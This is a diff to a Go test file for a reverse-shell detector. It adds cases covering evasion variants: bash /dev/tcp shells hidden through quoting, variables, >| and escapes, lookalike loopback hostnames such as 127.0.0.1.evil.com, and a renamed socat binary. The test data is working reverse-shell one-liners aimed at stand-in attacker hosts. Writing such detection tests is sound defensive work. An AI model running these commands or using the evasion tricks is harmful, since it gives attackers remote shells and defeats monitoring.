@@ -124,6 +124,22 @@ func TestDetectReverseShells(t *testing.T) {
 		{name: "python -c printing a file:line", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'print("error at app.py:12")'`}}, wantCount: 0},
 
 		// ...while the real forms of those patterns still fire.
+		// Bypasses found in review of the redirect-position rule: bash connects
+		// through quotes, variables, >| and escapes; a 127.* prefix is not loopback.
+		{name: "double-quoted /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>"/dev/tcp/10.0.0.1/4444"; cat <&3 | sh >&3 2>&3`}}, wantCount: 1},
+		{name: "single-quoted /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>'/dev/tcp/10.0.0.1/4444'; sh <&3 >&3`}}, wantCount: 1},
+		{name: "/dev/tcp path in a variable", processes: []Process{{PID: 1, User: "1000", Command: `bash -c d=/dev/tcp/10.0.0.1/4444; exec 3<>$d; sh <&3 >&3 2>&3`}}, wantCount: 1},
+		{name: "clobber redirect >| /dev/tcp", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3>|/dev/tcp/10.0.0.1/4444`}}, wantCount: 1},
+		{name: "escaped /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>\/dev/tcp/10.0.0.1/4444`}}, wantCount: 1},
+		{name: "/dev/tcp with variable port", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/evil.example.com/$PORT`}}, wantCount: 1},
+		{name: "127.* DNS name is not loopback", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/127.0.0.1.evil.com/4444; sh <&3 >&3 2>&3`}}, wantCount: 1},
+		{name: "localhost.* DNS name is not loopback", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/localhost.evil.com/4444`}}, wantCount: 1},
+		{name: "python -c to 127.* DNS name:port", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import urllib.request; urllib.request.urlopen("http://127.0.0.1.evil.com:8000/x")'`}}, wantCount: 1},
+		{name: "renamed socat binary with exec:", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x tcp:10.0.0.1:4444 exec:sh`}}, wantCount: 1},
+		{name: "renamed socat with openssl and system:", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x openssl-connect:evil:443 system:sh`}}, wantCount: 1},
+		{name: "IPv6 loopback /dev/tcp probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/::1/5432`}}, wantCount: 0},
+		{name: "rg for /dev/tcp/ in quotes", processes: []Process{{PID: 1, User: "1000", Command: `rg -n "/dev/tcp/" internal/`}}, wantCount: 0},
+		{name: "grep for exec: with a tcp word nearby", processes: []Process{{PID: 1, User: "1000", Command: `grep -rn "exec:" docs/tcp-notes.md`}}, wantCount: 0},
 		{name: "bash exec fd to remote /dev/tcp", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 5<>/dev/tcp/evil.example.com/443; cat <&5 | sh >&5`}}, wantCount: 1},
 		{name: "udp redirect reverse shell", processes: []Process{{PID: 1, User: "1000", Command: `zsh -c 'zmodload x; cat >& /dev/udp/10.0.0.1/53 0>&1'`}}, wantCount: 1},
 		{name: "perl -MIO reverse shell", processes: []Process{{PID: 1, User: "1000", Command: `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4444");STDIN->fdopen($c,r);'`}}, wantCount: 1},
